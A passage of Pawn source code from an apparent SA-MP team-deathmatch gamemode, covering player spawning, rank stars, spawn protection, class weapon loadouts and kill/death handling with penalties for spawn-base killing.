	   SetPlayerPos(playerid, RussiaSpawn[rand][0], RussiaSpawn[rand][1], RussiaSpawn[rand][2]);
	   SetPlayerSkin(playerid, 285);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       new rand = random(sizeof(ArabSpawn));
	   SetPlayerPos(playerid, ArabSpawn[rand][0], ArabSpawn[rand][1], ArabSpawn[rand][2]);
	   SetPlayerSkin(playerid, 179);
	}
	else if(gTeam[playerid] == TEAM_AUS)
	{
       new rand = random(sizeof(AusSpawn));
	   SetPlayerPos(playerid, AusSpawn[rand][0], AusSpawn[rand][1], AusSpawn[rand][2]);
	   SetPlayerSkin(playerid, 206);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
       new rand = random(sizeof(USSpawn));
	   SetPlayerPos(playerid, USSpawn[rand][0], USSpawn[rand][1], USSpawn[rand][2]);
	   SetPlayerSkin(playerid, 287);
	}
	else if(gTeam[playerid] == TEAM_MERC)
	{
	    new rand = random(sizeof(MercSpawn));
	    SetPlayerPos(playerid, MercSpawn[rand][0], MercSpawn[rand][1], MercSpawn[rand][2]);
	    SetPlayerHealth(playerid, 999999);
	    SetPlayerColor(playerid, 0xF600F6FF);
	    GivePlayerWeapon(playerid, 38, 999999);
	    SetPlayerSkin(playerid, 217);
    }
   	else if(gTeam[playerid] == TEAM_MARVEL)
	{
	    new rand = random(sizeof(MARVELSpawn));
	    SetPlayerPos(playerid, MARVELSpawn[rand][0], MARVELSpawn[rand][1], MARVELSpawn[rand][2]);
	    SetPlayerHealth(playerid, 999999);
	    SetPlayerColor(playerid,0xFFFFFFFF);
	   	SetPlayerSkin(playerid, 122);
    }
	if(Captured[playerid][SNAKE] == 0 && IsPlayerCapturing[playerid][SNAKE] == 1)
    {
		LeavingSnakeFarm(playerid);
	}
	if(Captured[playerid][BAY] == 0 && IsPlayerCapturing[playerid][BAY] == 1)
    {
		LeavingBay(playerid);
	}
	if(Captured[playerid][BIG] == 0 && IsPlayerCapturing[playerid][BIG] == 1)
	{
		LeavingEar(playerid);
	}
	if(Captured[playerid][BRIDGE] == 0 && IsPlayerCapturing[playerid][BRIDGE] == 1)
	{
		LeavingBridge(playerid);
	}
	if(Captured[playerid][CITY] == 0 && IsPlayerCapturing[playerid][CITY] == 1)
	{
		LeavingCity(playerid);
	}
	if(Captured[playerid][CLUCKIN] == 0 && IsPlayerCapturing[playerid][CLUCKIN] == 1)
	{
		LeavingCluckin(playerid);
	}
	if(Captured[playerid][ARMY] == 0 && IsPlayerCapturing[playerid][ARMY] == 1)
	{
		LeavingArmy(playerid);
	}
	if(Captured[playerid][PETROL] == 0 && IsPlayerCapturing[playerid][PETROL] == 1)
	{
		LeavingPetrol(playerid);
	}
	if(Captured[playerid][OIL] == 0 && IsPlayerCapturing[playerid][OIL] == 1)
	{
		LeavingOil(playerid);
	}
	if(Captured[playerid][DESERT] == 0 && IsPlayerCapturing[playerid][DESERT] == 1)
	{
		LeavingDesert(playerid);
	}
	if(Captured[playerid][QUARRY] == 0 && IsPlayerCapturing[playerid][QUARRY] == 1)
	{
		LeavingQuarry(playerid);
	}
	if(Captured[playerid][GUEST] == 0 && IsPlayerCapturing[playerid][GUEST] == 1)
	{
		LeavingGuest(playerid);
	}
	if(Captured[playerid][EAR] == 0 && IsPlayerCapturing[playerid][EAR] == 1)
	{
		LeavingEar(playerid);
	}
	if(Captured[playerid][SUBS] == 0 && IsPlayerCapturing[playerid][SUBS] == 1)
    {
		LeavingSubs(playerid);
	}
/*	new Pname[MAX_PLAYER_NAME];
	new string[30];
	new Stats[60];
	new Stats2[60];
	GetPlayerName(playerid, Pname, MAX_PLAYER_NAME);
	format(string, sizeof(string), "%s", Pname);
	TextDrawSetString(Textdraw0, string);
	format(Stats, sizeof(Stats), "Name: %s", Pname);
	format(Stats2, sizeof(Stats2), "Score: ~b~%d", GetPlayerScore(playerid));
	format(Stats, sizeof(Stats), "%s~n~~w~Kills: ~g~%d", Stats, PlayerInfo[playerid][Kills]);
	format(Stats2, sizeof(Stats2), "%s~n~~w~Deaths: ~r~%d", Stats2, PlayerInfo[playerid][Deaths]);
	TextDrawSetString(PSTATS1, Stats);
	TextDrawSetString(PSTATS2, Stats2);
	TextDrawShowForPlayer(playerid, Textdraw0);
	TextDrawShowForPlayer(playerid, PSTATS1);
	TextDrawShowForPlayer(playerid, PSTATS2);
*/

	TextDrawShowForPlayer(playerid, Rank1[playerid]);
	new str[200];
	format(str, sizeof(str),"~W~SCORE:~y~%d~n~~w~KILLS:~y~%d ~w~DEATHS:~y~%d", GetPlayerScore(playerid),PlayerInfo[playerid][Kills], PlayerInfo[playerid][Deaths]);
	TextDrawSetString(Rank1[playerid], str);
	if(GetPlayerScore(playerid) >= 50 && GetPlayerScore(playerid) <= 99)
	{
		TextDrawShowForPlayer(playerid, Star[0]);
		TextDrawHideForPlayer(playerid, Star[1]);
		TextDrawHideForPlayer(playerid, Star[2]);
		TextDrawHideForPlayer(playerid, Star[3]);
		TextDrawHideForPlayer(playerid, Star[4]);
		TextDrawHideForPlayer(playerid, Star[5]);
		TextDrawHideForPlayer(playerid, Star[6]);
		TextDrawHideForPlayer(playerid, Star[7]);
		TextDrawHideForPlayer(playerid, Star[8]);
		TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 100 && GetPlayerScore(playerid) <= 499)
	{
		TextDrawShowForPlayer(playerid, Star[0]);
		TextDrawShowForPlayer(playerid, Star[1]);
		TextDrawHideForPlayer(playerid, Star[2]);
		TextDrawHideForPlayer(playerid, Star[3]);
		TextDrawHideForPlayer(playerid, Star[4]);
		TextDrawHideForPlayer(playerid, Star[5]);
		TextDrawHideForPlayer(playerid, Star[6]);
		TextDrawHideForPlayer(playerid, Star[7]);
		TextDrawHideForPlayer(playerid, Star[8]);
		TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 500 && GetPlayerScore(playerid) <= 1499)
	{
		TextDrawShowForPlayer(playerid, Star[0]);
		TextDrawShowForPlayer(playerid, Star[1]);
		TextDrawShowForPlayer(playerid, Star[2]);
		TextDrawHideForPlayer(playerid, Star[3]);
		TextDrawHideForPlayer(playerid, Star[4]);
		TextDrawHideForPlayer(playerid, Star[5]);
		TextDrawHideForPlayer(playerid, Star[6]);
		TextDrawHideForPlayer(playerid, Star[7]);
		TextDrawHideForPlayer(playerid, Star[8]);
		TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 1500 && GetPlayerScore(playerid) <= 2499)
	{
		TextDrawShowForPlayer(playerid, Star[0]);
		TextDrawShowForPlayer(playerid, Star[1]);
		TextDrawShowForPlayer(playerid, Star[2]);
		TextDrawShowForPlayer(playerid, Star[3]);
		TextDrawHideForPlayer(playerid, Star[4]);
		TextDrawHideForPlayer(playerid, Star[5]);
		TextDrawHideForPlayer(playerid, Star[6]);
		TextDrawHideForPlayer(playerid, Star[7]);
		TextDrawHideForPlayer(playerid, Star[8]);
		TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 2500 && GetPlayerScore(playerid) <= 4999)
	{
		TextDrawShowForPlayer(playerid, Star[0]);
		TextDrawShowForPlayer(playerid, Star[1]);
		TextDrawShowForPlayer(playerid, Star[2]);
		TextDrawShowForPlayer(playerid, Star[3]);
		TextDrawShowForPlayer(playerid, Star[4]);
		TextDrawHideForPlayer(playerid, Star[5]);
		TextDrawHideForPlayer(playerid, Star[6]);
		TextDrawHideForPlayer(playerid, Star[7]);
		TextDrawHideForPlayer(playerid, Star[8]);
		TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 5000 && GetPlayerScore(playerid) <= 14999)
	{
		TextDrawShowForPlayer(playerid, Star[0]);
		TextDrawShowForPlayer(playerid, Star[1]);
		TextDrawShowForPlayer(playerid, Star[2]);
		TextDrawShowForPlayer(playerid, Star[3]);
		TextDrawShowForPlayer(playerid, Star[4]);
		TextDrawShowForPlayer(playerid, Star[5]);
		TextDrawHideForPlayer(playerid, Star[6]);
		TextDrawHideForPlayer(playerid, Star[7]);
		TextDrawHideForPlayer(playerid, Star[8]);
		TextDrawHideForPlayer(playerid, Star[9]);
		TextDrawShowForPlayer(playerid, Rank1[playerid]);
	}
	else if(GetPlayerScore(playerid) >= 15000 && GetPlayerScore(playerid) <= 24999)
	{
		TextDrawShowForPlayer(playerid, Star[0]);
		TextDrawShowForPlayer(playerid, Star[1]);
		TextDrawShowForPlayer(playerid, Star[2]);
		TextDrawShowForPlayer(playerid, Star[3]);
		TextDrawShowForPlayer(playerid, Star[4]);
		TextDrawShowForPlayer(playerid, Star[5]);
		TextDrawShowForPlayer(playerid, Star[6]);
		TextDrawHideForPlayer(playerid, Star[7]);
		TextDrawHideForPlayer(playerid, Star[8]);
		TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 25000 && GetPlayerScore(playerid) <= 34999)
	{
		TextDrawShowForPlayer(playerid, Star[0]);
		TextDrawShowForPlayer(playerid, Star[1]);
		TextDrawShowForPlayer(playerid, Star[2]);
		TextDrawShowForPlayer(playerid, Star[3]);
		TextDrawShowForPlayer(playerid, Star[4]);
		TextDrawShowForPlayer(playerid, Star[5]);
		TextDrawShowForPlayer(playerid, Star[6]);
		TextDrawShowForPlayer(playerid, Star[7]);
		TextDrawHideForPlayer(playerid, Star[8]);
		TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 35000 && GetPlayerScore(playerid) <= 49999)
	{
		TextDrawShowForPlayer(playerid, Star[0]);
		TextDrawShowForPlayer(playerid, Star[1]);
		TextDrawShowForPlayer(playerid, Star[2]);
		TextDrawShowForPlayer(playerid, Star[3]);
		TextDrawShowForPlayer(playerid, Star[4]);
		TextDrawShowForPlayer(playerid, Star[5]);
		TextDrawShowForPlayer(playerid, Star[6]);
		TextDrawShowForPlayer(playerid, Star[7]);
		TextDrawShowForPlayer(playerid, Star[8]);
		TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 100000)
	{
		TextDrawShowForPlayer(playerid, Star[0]);
		TextDrawShowForPlayer(playerid, Star[1]);
		TextDrawShowForPlayer(playerid, Star[2]);
		TextDrawShowForPlayer(playerid, Star[3]);
		TextDrawShowForPlayer(playerid, Star[4]);
		TextDrawShowForPlayer(playerid, Star[5]);
		TextDrawShowForPlayer(playerid, Star[6]);
		TextDrawShowForPlayer(playerid, Star[7]);
		TextDrawShowForPlayer(playerid, Star[8]);
		TextDrawShowForPlayer(playerid, Star[9]);
	}
	if(gTeam[playerid] == TEAM_EURASIA)
	{
		SetPlayerTeam(playerid, TEAM_EURASIA);
		SetPlayerColor(playerid, TEAM_EURASIA_COLOR);
	}
	if(gTeam[playerid] == TEAM_ARAB)
	{
		SetPlayerTeam(playerid, TEAM_ARAB);
		SetPlayerColor(playerid, TEAM_ARAB_COLOR);
	}
	if(gTeam[playerid] == TEAM_SOVIET)
	{
		SetPlayerTeam(playerid, TEAM_SOVIET);
		SetPlayerColor(playerid, TEAM_SOVIET_COLOR);
	}
	if(gTeam[playerid] == TEAM_USA)
	{
		SetPlayerTeam(playerid, TEAM_USA);
		SetPlayerColor(playerid, TEAM_USA_COLOR);
	}
	if(gTeam[playerid] == TEAM_AUS)
	{
		SetPlayerTeam(playerid, TEAM_AUS);
		SetPlayerColor(playerid, TEAM_AUS_COLOR);
	}
	if(gTeam[playerid] == TEAM_MARVEL)
	{
		SetPlayerTeam(playerid, TEAM_MARVEL);
		SetPlayerColor(playerid, TEAM_MARVEL_COLOR);
	}
    if(PlayerInfo[playerid][OnDuty] == 1)
	{
	    SetPlayerHealth(playerid, 99999);
	    SetPlayerColor(playerid,0xF600F6FF);
	    GivePlayerWeapon(playerid, 38, 999999);
	    SetPlayerSkin(playerid, 217);
    }
	PlayerInfo[playerid][Spawned] = 1;

	if(PlayerInfo[playerid][Frozen] == 1)
	{
		TogglePlayerControllable(playerid,false); return SendClientMessage(playerid,red,"You cant escape your punishment. You Are Still Frozen");
	}
	if(PlayerInfo[playerid][Jailed] == 1)
	{
	    JailPlayer(playerid); return SendClientMessage(playerid,red,"You cant escape your punishment. You Are Still In Jail");
	}
	if(ServerInfo[AdminOnlySkins] == 1)
	{
		if( (GetPlayerSkin(playerid) == ServerInfo[AdminSkin]) || (GetPlayerSkin(playerid) == ServerInfo[AdminSkin2]) )
		{
			if(PlayerInfo[playerid][Level] >= 1)
				GameTextForPlayer(playerid,"~b~Welcome~n~~w~Admin",3000,1);
			else
			{
				GameTextForPlayer(playerid,"~r~This Skin Is For~n~Administrators~n~Only",4000,5);
				//SetTimerEx("DelayKillPlayer", 2500,0,"d",playerid);
				return 1;
			}
		}
	}
	GangZoneShowForAll(GZ_ZONE1, TEAM_ZONE_USA_COLOR); //USA
	GangZoneShowForAll(GZ_ZONE3, TEAM_ZONE_AUS_COLOR); // Australian Armada
	GangZoneShowForAll(GZ_ZONE2, TEAM_ZONE_EURASIA_COLOR); //Eurasia
	GangZoneShowForAll(GZ_ZONE4, TEAM_ZONE_SOVIET_COLOR); //Soviet
	GangZoneShowForAll(GZ_ZONE5, TEAM_ZONE_ARAB_COLOR);
	GangZoneShowForAll(GZ_ZONE7, TEAM_INDIA_COLOR); //Arabia



	SetPlayerMapIcon(playerid, 5, -36.5458, 2347.6426, 24.1406, 19,2,MAPICON_LOCAL); //SNakes farm

	SetPlayerMapIcon(playerid, 6, 260.0900,2889.5242,11.1854, 19,2,MAPICON_LOCAL); //Bay side

	SetPlayerMapIcon(playerid, 7, 239.5721,1859.1677,14.0840, 19,2,MAPICON_LOCAL); //Area 69

	SetPlayerMapIcon(playerid, 8, -551.6992,2593.0771,53.9348, 19,2,MAPICON_LOCAL); //Army hotel

	SetPlayerMapIcon(playerid, 9, 670.9215,1705.4658,7.1875, 19,2,MAPICON_LOCAL); //Army petrol bunk

	SetPlayerMapIcon(playerid, 10, 221.0856,1422.6615,10.5859, 19,2,MAPICON_LOCAL); //Oil Factory

	SetPlayerMapIcon(playerid, 11, 558.9932,1221.8896,11.7188, 19,2,MAPICON_LOCAL); //Oil Station

	SetPlayerMapIcon(playerid, 12, 588.3246,875.7402,-42.4973, 19,2,MAPICON_LOCAL); //Quarry

	SetPlayerMapIcon(playerid, 13, -314.8433,1773.9176,43.6406, 19,2,MAPICON_LOCAL); //Desert Guest house

	SetPlayerMapIcon(playerid, 14, -311.0136,1542.9733,75.5625, 19,2,MAPICON_LOCAL); //Big Ear
	
	SetPlayerMapIcon(playerid, 15, -1039.2631, 2578.4121, 74.0088, 19,2,MAPICON_LOCAL); // mini sirp
	
	SetPlayerMapIcon(playerid, 16, -726.0491, 1870.1030, 2.4109, 19,2,MAPICON_LOCAL); // subs
 //Cluckin
	TextDrawHideForPlayer(playerid, EUR);
	TextDrawHideForPlayer(playerid, I);
	TextDrawHideForPlayer(playerid, E);
	TextDrawHideForPlayer(playerid, A);
	TextDrawHideForPlayer(playerid, S);
	TextDrawHideForPlayer(playerid, U);
	TextDrawHideForPlayer(playerid, A2);
	TextDrawHideForPlayer(playerid,Load);
	TextDrawHideForPlayer(playerid, welcometo1);
	TextDrawHideForPlayer(playerid, welcometo2);
	TextDrawShowForPlayer(playerid, Web);
	TextDrawShowForPlayer(playerid, BFB);
	TextDrawShowForPlayer(playerid, BFBO);
	return 1;
}

forward SpawnProtection(playerid);
public SpawnProtection(playerid)
{
    SendClientMessage(playerid, C_PINK,"Anti-Spawn kill over. You Are On Your Own Now!");
    GameTextForPlayer(playerid,"~b~You Are~w~ On Your~r~ Own",4000,5);
	AntiSK[playerid] = 0;
	TogglePlayerControllable(playerid, true);
	if (GetPlayerScore(playerid) >= 0 && GetPlayerScore(playerid) <= 49)
    {
	   SetPlayerHealth( playerid, 100 );
	   SetPlayerArmour(playerid, 1);
	}
	if (GetPlayerScore(playerid) >= 50 && GetPlayerScore(playerid) <= 99)
    {
	   SetPlayerHealth( playerid, 75 );
	}
	if (GetPlayerScore(playerid) >= 100 && GetPlayerScore(playerid) <= 299)
	{
		SetPlayerHealth(playerid, 95);
	}
	if (GetPlayerScore(playerid) >= 300 && GetPlayerScore(playerid) <= 499)
	{
		SetPlayerHealth(playerid, 100);
	}
    if (GetPlayerScore(playerid) >= 500 && GetPlayerScore(playerid) <= 999)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 5);
	}
	if (GetPlayerScore(playerid) >= 1000 && GetPlayerScore(playerid) <= 1499)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 15);
	}
	if (GetPlayerScore(playerid) >= 1500 && GetPlayerScore(playerid) <= 1999)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 30);
	}
	if (GetPlayerScore(playerid) >= 2000 && GetPlayerScore(playerid) <= 2499)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 40);
	}
	if (GetPlayerScore(playerid) >= 2500 && GetPlayerScore(playerid) <= 4999)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 50);
	}
	if (GetPlayerScore(playerid) >= 5000 && GetPlayerScore(playerid) <= 9999)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 75);
	}
	if (GetPlayerScore(playerid) >= 10000)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 100);
	}
 if(gTeam[playerid] == TEAM_EURASIA && gClass[playerid] == SNIPER)
	{
		SetPlayerColor(playerid, 0x15FF0000);
	}
	if(gTeam[playerid] == TEAM_ARAB && gClass[playerid] == SNIPER)
	{
        SetPlayerColor(playerid, 0xFFAF0200);
	}
	if(gTeam[playerid] == TEAM_SOVIET && gClass[playerid] == SNIPER)
	{
        SetPlayerColor(playerid, 0xFF000000);
	}
	if(gTeam[playerid] == TEAM_USA && gClass[playerid] == SNIPER)
	{
        SetPlayerColor(playerid, 0x515BC700);
	}
	if(gTeam[playerid] == TEAM_AUS && gClass[playerid] == SNIPER)
	{
        SetPlayerColor(playerid, 0x69006900);
	}
	if(gTeam[playerid] == TEAM_MARVEL && gClass[playerid] == SNIPER)
	{
        SetPlayerColor(playerid, 0xF4A06800);
	}
	return 1;
}
stock GivePlayerWeapons(playerid)
{
	if(gClass[playerid] == Assault)
	{
        GameTextForPlayer(playerid,"~r~Player Class~n~~g~Assault",4000,5);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 24, 100); //Deagle
		GivePlayerWeapon(playerid, 27, 200); //Shotgun
		GivePlayerWeapon(playerid, 31, 200); //M4
	}
	else if(gClass[playerid] == SNIPER)
	{
        GameTextForPlayer(playerid,"~r~Player Class~n~~g~Sniper",4000,5);
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 34, 200); //Sniper
		GivePlayerWeapon(playerid, 23, 200); //Silenced.
		GivePlayerWeapon(playerid, 4, 1); //Knife.
		GivePlayerWeapon(playerid, 29, 100); //Knife.
		//SniperColor(playerid);
	}
	else if(gClass[playerid] == PILOT)
	{
        GameTextForPlayer(playerid,"~r~Player Class~n~~g~Pilot",4000,5);
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 31, 200); //M4
		GivePlayerWeapon(playerid, 25, 100); //Shotgun
		GivePlayerWeapon(playerid, 24, 50); //Deagle
	}
	else if(gClass[playerid] == ENGINEER)
	{
        GameTextForPlayer(playerid,"~r~Player Class~n~~g~Engineer",4000,5);
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 6, 2); //M4
		GivePlayerWeapon(playerid, 25, 100); //Shotgun
		GivePlayerWeapon(playerid, 24, 50); //Deagle
		GivePlayerWeapon(playerid, 16, 5); //Grenades
		GivePlayerWeapon(playerid, 35, 2); //Grenades
	}
	else if(gClass[playerid] == JET)
	{
        GameTextForPlayer(playerid,"~r~Player Class~n~~g~JET",4000,5);
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 28, 500); //M4
		GivePlayerWeapon(playerid, 8, 2);
		GivePlayerWeapon(playerid, 23, 100); //Deagle
		GivePlayerWeapon(playerid, 16, 2); //Grenades
    }
    else if(gClass[playerid] == SP)
	{
        GameTextForPlayer(playerid,"~r~Player Class~n~~g~Support",4000,5);
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 27, 100);
		GivePlayerWeapon(playerid, 16, 1);
		GivePlayerWeapon(playerid, 24, 100);
		GivePlayerWeapon(playerid, 34, 100);
		GivePlayerWeapon(playerid, 31, 100);
	}
    else if(gClass[playerid] == SCOUT)
	{
        GameTextForPlayer(playerid,"~r~Player Class~n~~g~Scout",4000,5);
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 29, 100);
		GivePlayerWeapon(playerid, 26, 100);
		GivePlayerWeapon(playerid, 24, 200);
	}
	else if(gClass[playerid] == AG)
	{
        GameTextForPlayer(playerid,"~r~Player Class~n~~g~Spy",4000,5);
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 29, 100);
		GivePlayerWeapon(playerid, 4, 2);
		GivePlayerWeapon(playerid, 23, 200);
	}
	else if(gClass[playerid] == DONOR)
	{
        GameTextForPlayer(playerid,"~r~Player Class~n~~g~Donor",4000,5);
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 26, 200);
		GivePlayerWeapon(playerid, 24, 100);
		GivePlayerWeapon(playerid, 9, 2);
		GivePlayerWeapon(playerid, 34, 200);
		GivePlayerWeapon(playerid, 31, 200);
		GivePlayerWeapon(playerid, 35, 2);
		GivePlayerWeapon(playerid, 16, 5);
		GivePlayerWeapon(playerid, 1, 1);
	}
	else if(gClass[playerid] == GHOST)
	{
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 26, 200);
		GivePlayerWeapon(playerid, 33, 200);
		GivePlayerWeapon(playerid, 37, 9999999);
		GivePlayerWeapon(playerid, 1, 1);
	}
		else if(gClass[playerid] == IRONMAN)
	{
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 36, 20);
		GivePlayerWeapon(playerid, 31, 2000);
		GivePlayerWeapon(playerid, 23, 4000);

	}
else if(gClass[playerid] == SOLCON)
	{
        ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 44, 20);
		GivePlayerWeapon(playerid, 27, 2000);
		GivePlayerWeapon(playerid, 30, 4000);
	    GivePlayerWeapon(playerid, 23, 4000);
		}

    else if(PlayerInfo[playerid][OnDuty] == 1)
	{
        ResetPlayerWeapons(playerid);
		SetPlayerHealth(playerid, 999999);
        SetPlayerColor(playerid,0xF600F6FF);
        GivePlayerWeapon(playerid, 38, 9999999);
        SetPlayerSkin(playerid, 217);
	}
	return 1;
}

new RewardSoundEnd[MAX_PLAYERS];
public OnPlayerDeath(playerid, killerid, reason)
{
        PlayerInfo[playerid][Deaths]++;
        MinigunDM[playerid] = 0;
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
        Synching[playerid] = false;
      	if(Captured[playerid][SNAKE] == 0 && IsPlayerCapturing[playerid][SNAKE] == 1)
        {
			LeavingSnakeFarm(playerid);
		}
		if(Captured[playerid][BAY] == 0 && IsPlayerCapturing[playerid][BAY] == 1)
        {
			LeavingBay(playerid);
		}
		if(Captured[playerid][BIG] == 0 && IsPlayerCapturing[playerid][BIG] == 1)
		{
			LeavingEar(playerid);
		}
		if(Captured[playerid][BRIDGE] == 0 && IsPlayerCapturing[playerid][BRIDGE] == 1)
		{
			LeavingBridge(playerid);
		}
		if(Captured[playerid][CITY] == 0 && IsPlayerCapturing[playerid][CITY] == 1)
		{
			LeavingCity(playerid);
		}
		if(Captured[playerid][CLUCKIN] == 0 && IsPlayerCapturing[playerid][CLUCKIN] == 1)
		{
			LeavingCluckin(playerid);
		}
		if(Captured[playerid][ARMY] == 0 && IsPlayerCapturing[playerid][ARMY] == 1)
		{
			LeavingArmy(playerid);
		}
		if(Captured[playerid][PETROL] == 0 && IsPlayerCapturing[playerid][PETROL] == 1)
		{
			LeavingPetrol(playerid);
		}
		if(Captured[playerid][OIL] == 0 && IsPlayerCapturing[playerid][OIL] == 1)
		{
			LeavingOil(playerid);
		}
		if(Captured[playerid][DESERT] == 0 && IsPlayerCapturing[playerid][DESERT] == 1)
		{
			LeavingDesert(playerid);
		}
		if(Captured[playerid][QUARRY] == 0 && IsPlayerCapturing[playerid][QUARRY] == 1)
		{
			LeavingQuarry(playerid);
		}
		if(Captured[playerid][GUEST] == 0 && IsPlayerCapturing[playerid][GUEST] == 1)
		{
			LeavingGuest(playerid);
		}
		if(Captured[playerid][EAR] == 0 && IsPlayerCapturing[playerid][EAR] == 1)
		{
			LeavingEar(playerid);
		}
      	if(Captured[playerid][SUBS] == 0 && IsPlayerCapturing[playerid][SUBS] == 1)
        {
			LeavingSubs(playerid);
		}
		if(IsPlayerInArea(playerid, -353.515625,2574.21875,-113.28125,2796.875))
		{
			if(gTeam[playerid] == TEAM_USA)
			{
				if(IsPlayerInAnyVehicle(killerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(killerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 520 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 425 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 447)
					{
						new str[100];
						format(str, sizeof(str),""cgreen"%s - "cred"Base Rape", PlayerName2(killerid));
						MessageToAdmins(COLOR_WHITE, str);
						SetPlayerHealth(killerid,0);
						GameTextForPlayer(killerid,"~y~Base Rape Is Not Allowed", 3000, 3);

					}
				}
			}
		}
		if(IsPlayerInArea(playerid, 994.1957, 1817.512, 1185.533, 2049.596))
		{
			if(gTeam[playerid] == TEAM_EURASIA)
			{
				if(IsPlayerInAnyVehicle(killerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(killerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 520 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 425 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 447)
					{
						new str[100];
						format(str, sizeof(str),""cgreen"%s - "cred"Base Rape", PlayerName2(killerid));
						MessageToAdmins(COLOR_WHITE, str);
						SetPlayerHealth(killerid,0);
						GameTextForPlayer(killerid,"~y~Base Rape Is Not Allowed", 3000, 3);
					}
				}
			}
		}
		if(IsPlayerInArea(playerid, 89.0625000000005,2418.75,466.40625,2617.96875))
		{
			if(gTeam[playerid] == TEAM_AUS)
			{
				if(IsPlayerInAnyVehicle(killerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(killerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 520 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 425 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 447)
					{
						new str[100];
						format(str, sizeof(str),""cgreen"%s - "cred"Base Rape", PlayerName2(killerid));
						MessageToAdmins(COLOR_WHITE, str);
						SetPlayerHealth(killerid,0);
						GameTextForPlayer(killerid,"~y~Base Rape Is Not Allowed", 3000, 3);
					}
				}
			}
		}
		if(IsPlayerInArea(playerid, -309.375,1024.21875,103.125,1211.71875))
		{
			if(gTeam[playerid] == TEAM_SOVIET)
			{
				if(IsPlayerInAnyVehicle(killerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(killerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 520 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 425 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 447)
					{
						new str[100];
						format(str, sizeof(str),""cgreen"%s - "cred"Base Rape", PlayerName2(killerid));
						MessageToAdmins(COLOR_WHITE, str);
						SetPlayerHealth(killerid,0);
						GameTextForPlayer(killerid,"~y~Base Rape Is Not Allowed", 3000, 3);
					}
				}
			}
		}
		if(IsPlayerInArea(playerid, -875.8406, 1389.667, -607.2495, 1623.225))
		{
			if(gTeam[playerid] == TEAM_ARAB)
			{
				if(IsPlayerInAnyVehicle(killerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(killerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 520 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 425 || GetVehicleModel(GetPlayerVehicleID(killerid)) == 447)
					{
						new str[100];
						format(str, sizeof(str),""cgreen"%s - "cred"Base Rape", PlayerName2(killerid));
						MessageToAdmins(COLOR_WHITE, str);
						SetPlayerHealth(killerid,0);
						GameTextForPlayer(killerid,"~y~Base Rape Is Not Allowed", 3000, 3);
					}
				}
			}
		}

		SendDeathMessage(killerid, playerid, reason);

		if(gClass[killerid] == AG)
		{
			GameTextForPlayer(playerid, "~w~you got ~r~KILLED ~w~by a~n~~b~A SPY", 3000, 3);
		}
		//---------
		new msg[100];
		new ammount = random(1050);
		new amm = random(1050);
		format(msg, sizeof(msg), "Good job killing %s you have earn +1 score and $%d cash!Keep up the good work!", PlayerName2(playerid),ammount);
		SendClientMessage(killerid,green,msg);
		format(msg, sizeof(msg), "[KILL]%s has killed %s and has earned $%d! - %i", PlayerName2(killerid),PlayerName2(playerid),ammount,GetPlayerWeapon(killerid));
		SendClientMessageToAll(C_MARRON,msg);
		GameTextForPlayer(killerid,"~r~Well ~y~Done!",4000,5);
		GivePlayerMoney(killerid,ammount);
		GivePlayerMoney(playerid,-amm);
		format(msg, sizeof(msg), "You lost %d$ cash for dying. Take your Revenge today!",amm);
		SendClientMessage(playerid,RED,msg);
		GameTextForPlayer(playerid,"~b~You ~y~Got ~r~Killed!",4000,5);
//		PlayAudioStreamForPlayer(playerid, "http://picosong.com/media/songs/53c29889fdef5e0e3cce1529df4af014/humiliation.mp3");
